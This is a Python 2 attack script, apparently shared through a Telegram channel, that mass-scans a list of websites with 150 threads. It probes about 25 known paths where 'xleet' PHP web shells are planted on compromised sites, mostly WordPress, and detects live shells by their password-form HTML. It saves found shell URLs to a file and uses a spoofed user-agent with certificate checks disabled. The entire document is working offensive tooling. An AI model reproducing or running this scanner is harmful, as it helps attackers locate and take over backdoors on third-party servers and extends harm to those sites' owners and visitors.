import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

banner = '''{}
        Telegram Channels => https://t.me/flash_kiss					   
\n'''.format(fr)
print banner
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/xleet.php','/xl2023.php','/xl2023x.php','/xxl.php','/x.php','/xl.php','/wp-admin/xl2023.php','/wp-includes/xl2023.php','/.well-known/acme-challenge/iR7SzrsOUEP.php','/wp-admin/includes/iR7SzrsOUEP.php','/wp-admin/maint/iR7SzrsOUEP.php','/wp-content/upgrade/iR7SzrsOUEP.php','/images/iR7SzrsOUEP.php','/wp-admin/user/iR7SzrsOUEP.php','/wp-admin/js/widgets/iR7SzrsOUEP.php','/wp-admin/network/iR7SzrsOUEP.php','/wp-admin/images/iR7SzrsOUEP.php','/.well-known/pki-validation/iR7SzrsOUEP.php','/xleet-shell.php','/admin-heade.php','/cgi-bin/iR7SzrsOUEP.php','/wp-content/xl2023.php','/wp-content/xl2023.php','/iR7SzrsOUEP.php','/wp-content/uploads/xl2023.php']

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if("<pre align=center><form method=post>Password<br><input type=password name=pass" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('vulnxleet.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(150)
mp.map(RunUploader, target)
mp.close()
mp.join()